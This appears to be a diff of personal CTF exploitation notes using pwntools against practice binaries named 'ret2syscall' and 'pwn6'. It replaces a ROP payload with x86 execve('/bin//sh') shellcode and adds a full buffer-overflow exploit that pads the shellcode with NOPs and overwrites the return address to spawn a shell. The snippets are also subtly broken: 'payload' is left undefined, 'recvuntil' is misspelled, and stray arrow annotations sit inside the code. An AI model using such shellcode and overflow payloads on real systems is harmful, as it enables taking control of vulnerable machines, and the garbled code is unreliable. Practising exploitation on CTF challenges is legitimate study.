@@ -5,13 +5,21 @@ ROPgadget --binary ret2syscall --string '/bin/sh'
 pwntools:
 from pwn import *
 sh = process('./ret2syscall')
-payload = flat(
-    ['A' * 112, pop_eax_ret, 0xb, pop_ecx_ebx_ret, 0,binsh, pop_edx_ret,0, int_0x80])
+shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
 sh.sendline(payload)
 sh.interactive()
 sh.recvline()
 sh.revcuntil('[')--->daadsds[
 sh.revcuntil(']',drop=True)--->0x11223344
+
+eg1:
+from pwn import *
+sh = process('./pwn6')
+esp=0xffffd1da
+shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
+payload = shellcode+'\x90'*12+p32(esp-0x24)
+sh.sendline(payload)
+sh.interactive()
 
     
   
